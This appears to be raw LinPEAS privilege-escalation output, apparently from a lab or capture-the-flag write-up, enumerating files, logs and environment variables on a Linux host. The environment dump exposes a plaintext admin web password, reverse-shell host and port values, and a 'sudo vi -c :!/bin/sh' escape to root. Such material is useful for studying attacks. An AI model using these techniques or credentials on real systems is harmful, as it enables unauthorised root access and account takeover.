╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 955, cookie 0x4, schema 4, UTF-8, version-valid-for 5                                          
Found /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db: data
Found /var/lib/docker/buildkit/cache.db: data
Found /var/lib/docker/buildkit/containerdmeta.db: data
Found /var/lib/docker/buildkit/history.db: data
Found /var/lib/docker/buildkit/metadata_v2.db: data
Found /var/lib/docker/buildkit/snapshots.db: data
Found /var/lib/docker/network/files/local-kv.db: data
Found /var/lib/docker/volumes/metadata.db: data
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 3, database pages 8, cookie 0x5, schema 4, UTF-8, version-valid-for 3
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/plocate/plocate.db: data

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                                                                                             
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Web files?(output limit)
                                                                                                                                                                                                                                            
╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 46 May 12 08:40 /root/hot/server/frontend/node_modules/reusify/.coveralls.yml                                                                                                                                        
-rw-r--r-- 1 root root 496 May 12 08:40 /root/hot/server/frontend/node_modules/ajv/.runkit_example.js
-rw-r--r-- 1 root root 91 May 12 08:40 /root/hot/server/frontend/node_modules/json-schema-traverse/spec/.eslintrc.yml
-rw-r--r-- 1 root root 630 May 12 08:40 /root/hot/server/frontend/node_modules/json-schema-traverse/.eslintrc.yml
-rw-r--r-- 1 root root 139 May 12 08:40 /root/hot/server/frontend/node_modules/supports-preserve-symlinks-flag/.nycrc
-rw-r--r-- 1 root root 132 May 12 08:40 /root/hot/server/frontend/node_modules/supports-preserve-symlinks-flag/.eslintrc
-rw-r--r-- 1 root root 1160 May 12 08:40 /root/hot/server/frontend/node_modules/color-name/.eslintrc.json
-rw-r--r-- 1 root root 113 May 12 08:40 /root/hot/server/frontend/node_modules/deepmerge/.editorconfig
-rw-r--r-- 1 502 dialout 4140 May 12 08:40 /root/hot/server/frontend/node_modules/function-bind/.jscs.json
-rw-r--r-- 1 502 dialout 231 May 12 08:40 /root/hot/server/frontend/node_modules/function-bind/.eslintrc
-rw-r--r-- 1 502 dialout 176 May 12 08:40 /root/hot/server/frontend/node_modules/function-bind/test/.eslintrc
-rw-r--r-- 1 502 dialout 286 May 12 08:40 /root/hot/server/frontend/node_modules/function-bind/.editorconfig
-rw-r--r-- 1 root root 1687 May 12 08:40 /root/hot/server/frontend/node_modules/resolve/.eslintrc
-rw-r--r-- 1 root root 605 May 12 08:40 /root/hot/server/frontend/node_modules/resolve/.editorconfig
-rw-r--r-- 1 root root 139 May 12 08:40 /root/hot/server/frontend/node_modules/is-core-module/.nycrc
-rw-r--r-- 1 root root 339 May 12 08:40 /root/hot/server/frontend/node_modules/is-core-module/.eslintrc
-rw-r--r-- 1 root root 192 May 12 08:40 /root/hot/server/frontend/node_modules/commitizen/.eslintrc
-rw-r--r-- 1 root root 162 May 12 08:40 /root/hot/server/frontend/node_modules/commitizen/.editorconfig
-rw-r--r-- 1 root root 67 May 12 08:40 /root/hot/server/frontend/node_modules/cz-conventional-changelog/.prettierrc
-rw-r--r-- 1 root root 155 May 12 08:40 /root/hot/server/frontend/node_modules/cz-conventional-changelog/.editorconfig
-rw-r--r-- 1 root root 545 May 12 08:40 /root/hot/server/frontend/node_modules/xtend/.jshintrc
-rw-r--r-- 1 501 dialout 59 May 12 08:40 /root/hot/server/frontend/node_modules/is-arrayish/.istanbul.yml
-rw-r--r-- 1 501 dialout 264 May 12 08:40 /root/hot/server/frontend/node_modules/is-arrayish/.editorconfig
-rw-r--r-- 1 root root 68 May 12 08:40 /root/hot/server/frontend/node_modules/gensync/test/.babelrc
-rw-r--r-- 1 root root 203 May 12 08:40 /root/hot/server/frontend/node_modules/microseconds/.prettierrc
-rw-r--r-- 1 root root 145242 May 12 08:40 /root/hot/server/frontend/node_modules/.package-lock.json
-rw-r--r-- 1 root root 11 Aug 27  2022 /usr/share/ieee-data/.lastupdate
-rw-r--r-- 1 root root 414 Apr  1 20:12 /usr/share/vim/vim91/pack/dist/opt/editorconfig/.editorconfig
-rw-r--r-- 1 app-admin app-admin 220 Mar 31  2024 /home/app-admin/.bash_logout
-rw-r--r-- 1 root root 2 May 26 13:32 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 0 May 26 13:32 /run/ubuntu-fan/.lock
-rw-r--r-- 1 root root 2503 May  2 11:27 /var/cache/apparmor/2693c843.0/.features
-rw-r--r-- 1 root root 2499 May  1 10:31 /var/cache/apparmor/baad73a1.0/.features
-rw-r--r-- 1 root root 208 Feb 16 20:51 /var/.updated
-rw-r--r-- 1 landscape landscape 0 Feb 16 21:04 /var/lib/landscape/.cleanup.user
-rw------- 1 root root 0 Feb 16 20:51 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Mar 31  2024 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 208 Feb 16 20:51 /etc/.updated
-rw-r--r-- 1 root root 862 Feb 16 20:57 /etc/.resolv.conf.systemd-resolved.bak

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 root root 954437 Jun  1 04:38 /tmp/linpeas.sh                                                                                                                                                                                  
-rw-r--r-- 1 root root 393788 Feb 16 21:04 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/service-2.json
-rw-r--r-- 1 root root 3064 Feb 16 21:04 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/paginators-1.json
-rw-r--r-- 1 root root 13726 Feb 16 21:04 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/endpoint-rule-set-1.json
-rw-r--r-- 1 root root 44 Feb 16 21:04 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/examples-1.json
-rw-r--r-- 1 root root 32 May  2 00:00 /var/backups/dpkg.arch.6.gz
-rw-r--r-- 1 root root 32 May 13 00:00 /var/backups/dpkg.arch.3.gz
-rw-r--r-- 1 root root 0 May 20 00:00 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 2215 May  2 00:00 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 32 May  8 00:00 /var/backups/dpkg.arch.4.gz
-rw-r--r-- 1 root root 32 May 16 00:00 /var/backups/dpkg.arch.2.gz
-rw-r--r-- 1 root root 32 May  3 00:00 /var/backups/dpkg.arch.5.gz
-rw-r--r-- 1 root root 40960 May  3 00:00 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 32 May 17 00:00 /var/backups/dpkg.arch.1.gz

╔══════════╣ Searching passwords in history files
/home/app-admin/.bash_history:sudo nano auth.log                                                                                                                                                                                            
/home/app-admin/.bash_history:sudo vi auth.log
/home/app-admin/.bash_history:su -

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/apparmor.d/1password                                                                                                                                                                                                                   
/etc/credstore
/etc/credstore.encrypted
/etc/pam.d/common-password
/root/hot/server/frontend/node_modules/caniuse-lite/data/features/credential-management.js
/root/hot/server/frontend/node_modules/caniuse-lite/data/features/passwordrules.js
/root/hot/server/frontend/node_modules/inquirer/lib/prompts/password.js
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/x86_64-efi/password.mod
/usr/lib/grub/x86_64-efi/password_pbkdf2.mod
/usr/lib/python3/dist-packages/botocore/credentials.py
/usr/lib/python3/dist-packages/botocore/__pycache__/credentials.cpython-312.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-312.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-312.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-312.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-312.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-312.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-312.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc.perl
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man7/systemd.system-credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/nodejs/caniuse-lite/data/features/passwordrules.js
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/apparmor/2693c843.0/1password
/var/cache/apparmor/baad73a1.0/1password
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/etc/pam.d/common-password
/var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/share/pam/common-password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/auth.log:2025-07-19T08:56:41.502154+00:00 app-server sshd[52548]: Accepted password for app-admin from 192.168.90.84 port 55006 ssh2                                                                                               
/var/log/auth.log:2025-07-19T09:06:43.073908+00:00 app-server sudo: app-admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/vi auth.log
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.34); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log: base-passwd depends on libselinux1 (>= 3.1~); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.6.3build1_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.13+dfsg1-4ubuntu3_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.6.3build1) ...
/var/log/bootstrap.log:Setting up passwd (1:4.13+dfsg1-4ubuntu3) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.6.3build1) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.6.3build1) over (3.6.3build1) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.13+dfsg1-4ubuntu3) ...
/var/log/cloud-init.log:2025-05-01 10:31:36,193 - cc_set_passwords.py[DEBUG]: Leaving SSH config 'PasswordAuthentication' unchanged. ssh_pwauth=None
/var/log/dmesg.0:[    2.321569] systemd[1]: Started systemd-ask-password-wall.path - Forward Password Requests to Wall Directory Watch.
/var/log/dmesg:[    2.428169] systemd[1]: Started systemd-ask-password-wall.path - Forward Password Requests to Wall Directory Watch.
/var/log/dpkg.log.1:2025-02-16 20:51:12 configure base-passwd:amd64 3.6.3build1 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:12 install base-passwd:amd64 <none> 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:12 status half-configured base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:12 status half-installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:12 status installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:12 status unpacked base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:13 status half-configured base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:13 status half-installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:13 status unpacked base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:13 upgrade base-passwd:amd64 3.6.3build1 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:16 install passwd:amd64 <none> 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:51:16 status half-installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:51:16 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:51:17 configure base-passwd:amd64 3.6.3build1 <none>
/var/log/dpkg.log.1:2025-02-16 20:51:17 status half-configured base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:17 status installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:17 status unpacked base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:18 configure passwd:amd64 1:4.13+dfsg1-4ubuntu3 <none>
/var/log/dpkg.log.1:2025-02-16 20:51:18 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:51:18 status installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:51:18 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:51:32 configure base-passwd:amd64 3.6.3build1 <none>
/var/log/dpkg.log.1:2025-02-16 20:51:32 status half-configured base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:32 status half-installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:32 status installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:32 status unpacked base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:51:32 upgrade base-passwd:amd64 3.6.3build1 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:56:52 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:56:52 status half-installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:56:52 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:56:52 upgrade passwd:amd64 1:4.13+dfsg1-4ubuntu3 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:56:53 configure passwd:amd64 1:4.13+dfsg1-4ubuntu3 <none>
/var/log/dpkg.log.1:2025-02-16 20:56:53 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:56:53 status installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:56:53 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:57:38 configure passwd:amd64 1:4.13+dfsg1-4ubuntu3.2 <none>
/var/log/dpkg.log.1:2025-02-16 20:57:38 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:57:38 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3.2
/var/log/dpkg.log.1:2025-02-16 20:57:38 status half-installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:57:38 status installed passwd:amd64 1:4.13+dfsg1-4ubuntu3.2
/var/log/dpkg.log.1:2025-02-16 20:57:38 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
/var/log/dpkg.log.1:2025-02-16 20:57:38 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3.2
/var/log/dpkg.log.1:2025-02-16 20:57:38 upgrade passwd:amd64 1:4.13+dfsg1-4ubuntu3 1:4.13+dfsg1-4ubuntu3.2
/var/log/dpkg.log.1:2025-02-16 20:58:45 configure base-passwd:amd64 3.6.3build1 <none>
/var/log/dpkg.log.1:2025-02-16 20:58:45 status half-configured base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:58:45 status half-installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:58:45 status installed base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:58:45 status unpacked base-passwd:amd64 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:58:45 upgrade base-passwd:amd64 3.6.3build1 3.6.3build1
/var/log/dpkg.log.1:2025-02-16 20:58:46 configure passwd:amd64 1:4.13+dfsg1-4ubuntu3.2 <none>
/var/log/dpkg.log.1:2025-02-16 20:58:46 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3.2

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
                                                                                                                                                                                                                                            
=
]
_=/bin/sh
BOOT_IMAGE=/vmlinuz-6.8.0-60-generic
CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service
CREDENTIALS_DIRECTORY=/run/credentials/systemd-resolved.service
drop_caps=
FDSTORE=4224
FDSTORE=512
GOMAXPROCS=4
GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
GRPC_ADDRESS=/run/containerd/containerd.sock
hd -D [listener] 0 of 10-100 startups
HOME=/
HOME=/home/app-admin
HOME=/root
HOSTNAME=ba2e8eee8c90
HOSTNAME=d479c6a3d980
HOTHOST_WEB_ADMIN_PASSWORD=Very3stroungPassword
HOTHOST_WEB_ADMIN_USERNAME=admin
HOTHOST_WEB_PORT=8091
HOTHOST_WEB_PUBLIC_VIEW_ENABLED=false
HUSHLOGIN=FALSE
init=/sbin/init
LANG=C.UTF-8
LANG=en_US.UTF-8
LD_LIBRARY_PATH=/opt/containerd/lib:
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
_=./linpeas.sh
LISTEN_FDNAMES=dbus.socket
LISTEN_FDNAMES=docker.socket
LISTEN_FDNAMES=multipathd.socket
LISTEN_FDNAMES=syslog.socket
LISTEN_FDNAMES=systemd-journald-dev-log.socket:systemd-journald.socket:systemd-journald.socket
LISTEN_FDNAMES=systemd-networkd.socket
LISTEN_FDNAMES=systemd-udevd-control.socket:systemd-udevd-kernel.socket
LISTEN_FDS=1
LISTEN_FDS=2
LISTEN_FDS=3
LOGNAME=app-admin
LOGNAME=polkitd
LOGNAME=root
LOGNAME=systemd-network
LOGNAME=systemd-resolve
LOGNAME=systemd-timesync
MAIL=/var/mail/app-admin
MAIL=/var/mail/root
MAX_SHIM_VERSION=2
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
NAMESPACE=moby
NETWORK_SKIP_ENSLAVED=
NODE_VERSION=18.20.8
NOTIFY_SOCKET=/run/systemd/notify
OLDPWD=/
OLDPWD=/var
OTEL_EXPORTER_OTLP_METRICS_PROTOCOL=http/protobuf
OTEL_EXPORTER_OTLP_TRACES_PROTOCOL=http/protobuf
OTEL_SERVICE_NAME=dockerd
PWD=/
PWD=/home/app-admin
PWD=/tmp
PWD=/var/log
PYTHON_SHA256=8c136d199d3637a1fce98a16adc809c1d83c922d02d41f3614b34f8b6e7d38ec
PYTHON_VERSION=3.9.22
RHOST=192.168.90.84
rootmnt=/root
_=RPORT=9009
RPORT=9009
RUNTIME_DIRECTORY=/run/systemd/journal
RUNTIME_DIRECTORY=/run/systemd/netif
RUNTIME_DIRECTORY=/run/systemd/resolve
RUNTIME_DIRECTORY=/run/systemd/timesync
SHELL=/bin/bash
SHELL=/usr/bin/bash
SHLVL=0
SHLVL=1
SHLVL=2
SHLVL=3
SSH_CLIENT=192.168.90.84 55006 22
SSH_CONNECTION=192.168.90.84 55006 172.26.10.11 22
SSH_TTY=/dev/pts/0
STATE_DIRECTORY=/var/lib/systemd/linger
STATE_DIRECTORY=/var/lib/systemd/timesync
STATE_DIRECTORY=/var/lib/upower
SUDO_COMMAND=/usr/bin/vi -c :!/bin/sh /dev/null
SUDO_GID=1000
SUDO_UID=1000
SUDO_USER=app-admin
SYSTEMD_NSS_DYNAMIC_BYPASS=1
SYSTEMD_NSS_RESOLVE_VALIDATE=0
TERM=linux
TERM=xterm-256color
TMPDIR=/var/lib/docker/tmp
TTRPC_ADDRESS=/run/containerd/containerd.sock.ttrpc
USER=app-admin
USER=polkitd
USER=root
USER=systemd-network
USER=systemd-resolve
USER=systemd-timesync
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/python3
_=/usr/bin/su
_=/usr/bin/sudo
_=/usr/bin/xxd
VIMRUNTIME=/usr/share/vim/vim91
VIM=/usr/share/vim
WATCHDOG_USEC=180000000
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
XDG_RUNTIME_DIR=/run/user/1000
XDG_SEAT=seat0
XDG_VTNR=1
YARN_VERSION=1.22.22


```

</details>
